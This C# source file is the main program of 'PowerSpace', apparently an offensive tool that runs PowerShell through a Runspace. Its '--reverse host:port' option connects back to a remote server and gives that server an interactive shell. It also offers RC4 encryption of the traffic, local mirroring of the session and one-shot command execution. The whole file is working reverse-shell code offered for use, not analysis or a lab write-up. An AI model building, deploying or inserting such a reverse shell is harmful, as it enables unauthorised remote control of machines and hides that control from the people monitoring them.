using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Text;
using System.Threading.Tasks;


namespace PowerSpace
{
    internal class Options
    {
        internal readonly bool Help = false;
        internal readonly bool Verbose = false;
        internal readonly bool Mirror = false;
        internal readonly bool Colorize = false;
        internal readonly bool Pipeline = false;
        internal readonly string Execute = null;
        internal readonly byte[] Rc4Key = null;
        internal readonly IPAddress ReverseIP = null;
        internal readonly int ReversePort = -1;

        internal Options(string[] args)
        {
            string[] aux;

            if (args.Length < 1)
                return;

            for (int i = 0; i < args.Length; ++i)
            {
                if (args[i].Equals("-h") || args[i].Equals("--help"))
                    Help = true;
                else
                if (args[i].Equals("-v") || args[i].Equals("--verbose"))
                    Verbose = true;
                else
                if (args[i].Equals("-m") || args[i].Equals("--mirror"))
                    Mirror = true;
                else
                if (args[i].Equals("-c") || args[i].Equals("--colorize"))
                    Colorize = true;
                else
                if (args[i].Equals("-p") || args[i].Equals("--pipeline"))
                    Pipeline = true;
                else
                if (i < args.Length - 1)
                {
                    if (args[i].Equals("-e") || args[i].Equals("--execute"))
                    {
                        ++i;
                        Execute = args[i];
                    }
                    else
                    if (args[i].Equals("-r") || args[i].Equals("--reverse"))
                    {
                        ++i;

                        try
                        {
                            aux = args[i].Split(':');

                            if (aux.Length != 2)
                                throw new Exception();

                            ReverseIP = IPAddress.Parse(aux[0]);
                            ReversePort = int.Parse(aux[1]);

                            if (ReversePort < 1 || ReversePort > 65535)
                                throw new Exception();
                        }
                        catch (Exception)
                        {
                            throw new ArgumentException("invalid [host:port]: " + args[i]);
                        }
                    }
                    else
                    if (args[i].Equals("-k") || args[i].Equals("--key"))
                    {
                        ++i;

                        try
                        {
                            Rc4Key = Enumerable.Range(0, args[i].Length / 2)
                                .Select(x => Convert.ToByte(args[i].Substring(x * 2, 2), 16)).ToArray();
                        }
                        catch (Exception)
                        {
                            throw new ArgumentException("invalid [hex]: " + args[i]);
                        }
                    }
                }
            }

            if (Mirror && ReverseIP == null)
                throw new ArgumentException("Option -m makes no sense without -r");
        }
    }

    internal class Program
    {
        private const string _Banner = (
            "PowerSpace [options]?\n" +
                    "\t-h, --help                  print this banner\n" +
                    "\t-v, --verbose               enable runtime messages\n" +
                    "\t-m, --mirror                mirror the remote shell locally when [-r] is used\n" +
                    "\t-c, --colorize              enable colorized prompt\n" +
                    "\t-p, --pipeline              execute in a Runspace pipeline instead of a PowerShell\n" +
                    "\t-e, --execute  [commands]   execute [commands] and exit\n" +
                    "\t-r, --reverse  [host:port]  connect back to server at [host:port]\n" +
                    "\t-k, --key      [hex]        enable RC4 encryption by specifying a key\n\n" +

                    "\tNote: if no [cmd] is given, the shell becomes interactive\n"
        );

        private static string Strip(string s)
        {
            s = s.Trim('\n');
            s = s.Trim(' ');
            s = s.Trim('\t');
            s = s.Trim('\r');

            return s;
        }

        private static string FormatException(Exception e)
        {
            return e.ToString();
        }

        static void Main(string[] args)
        {
            Options options;
            Shell shell;
            Connection connection = null;

            string input;
            string output = "";

            try
            {
                options = new Options(args);
            }
            catch (ArgumentException e)
            {
                Console.WriteLine(FormatException(e));
                return;
            }

            Console.Write("\n");

            if (options.Help)
            {
                Console.Write(_Banner);
                return;
            }

            try
            {
                if (options.Verbose)
                    Console.WriteLine("[PowerSpace] Initializing the Runspace");

                shell = new Shell(options.Pipeline);


                if (options.ReverseIP != null && options.ReversePort != -1)
                {
                    if (options.Verbose)
                    {
                        Console.WriteLine(
                            "[PowerSpace] Connecting to " +
                            options.ReverseIP.ToString() + ":" + options.ReversePort.ToString()
                        );
                    }

                    connection = new Connection(options.ReverseIP, options.ReversePort, options.Rc4Key);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(FormatException(e));
                return;
            }

            if (options.Execute != null)
            {
                try
                {
                    if (options.Verbose)
                        Console.WriteLine("[PowerSpace] Executing: " + options.Execute);

                    output = shell.Invoke(options.Execute);
                }
                catch (Exception e)
                {
                    output = FormatException(e) + "\n";
                }

                if (connection != null)
                {
                    try
                    {
                        connection.SendString(output);

                        if (options.Mirror)
                            Console.Write(output);

                        connection.Close();
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(FormatException(e));
                    }
                }
                else
                    Console.Write(output);

                return;
            }

            while (true)
            {
                input = "";
                output += Shell.Prompt(options.Colorize);

                while (input.Length < 1)
                {
                    if (connection != null)
                    {
                        connection.SendString(output);

                        if (options.Mirror)
                            Console.Write(output);

                        input = connection.ReceiveString();
                    }
                    else
                    {
                        Console.Write(output);
                        input = Console.ReadLine();
                    }

                    input = Strip(input);
                    output = Shell.Prompt();
                }

                if (options.Mirror)
                    Console.Write(input + "\n");

                try
                {
                    if (input.StartsWith("cd "))
                        output = shell.BuiltinCD(input);
                    else
                    if (input.Equals("reset"))
                    {
                        output = shell.BuiltinReset();
                    }
                    else
                    if (input.Equals("exit"))
                    {
                        if (connection != null && options.Verbose)
                            Console.WriteLine("[PowerSpace] Connection closed by the remote host");

                        break;
                    }
                    else
                        output = shell.Invoke(input);
                }
                catch (Exception e)
                {
                    output = FormatException(e) + "\n";
                }
            }

            connection.Close();
            shell.Close();
        }
    }
}
